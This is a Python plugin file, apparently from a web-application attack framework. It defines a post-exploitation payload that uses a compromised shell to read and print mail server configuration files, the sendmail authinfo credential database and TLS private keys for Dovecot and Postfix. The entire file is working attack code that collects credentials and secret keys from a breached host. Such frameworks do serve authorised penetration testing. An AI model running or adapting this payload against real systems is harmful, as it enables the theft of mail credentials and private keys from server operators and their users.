import re
from plugins.attack.payloads.base_payload import base_payload

class mail_config_files(base_payload):
    '''
    This payload shows mail configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/mail/sendmail.cf')
        files.append('/etc/mail/sendmail.mc')
        files.append('/etc/sendmail.cf')
        files.append('/var/adm/sendmail/sendmail.cf')
        files.append('/etc/mail/submit.cf')
        files.append('/etc/postfix/main.cf')
        files.append('/etc/postfix/master.cf')
        files.append('/etc/ssmtp/ssmtp.conf')
        files.append('/etc/ssmtp/revaliases')
        files.append('/etc/mail/local-host-names')
        files.append('/etc/mail/access')
        files.append('/etc/mail/authinfo.db')
        files.append('/etc/imapd.conf')
        files.append('/etc/dovecot.conf')
        files.append('/etc/dovecot/dovecot.conf')
        files.append('/etc/mail/sendmail.mc')

        files.append('/usr/share/ssl/certs/dovecot.pem')
        files.append('/usr/share/ssl/private/dovecot.pem')
        files.append('/usr/share/ssl/certs/imapd.pem')
        files.append('/etc/postfix/ssl/smtpd.pem')
        files.append('/etc/postfix/ssl/smtpd-key.pem')


        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('Mail Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('Mail configuration files not found.')
        return result

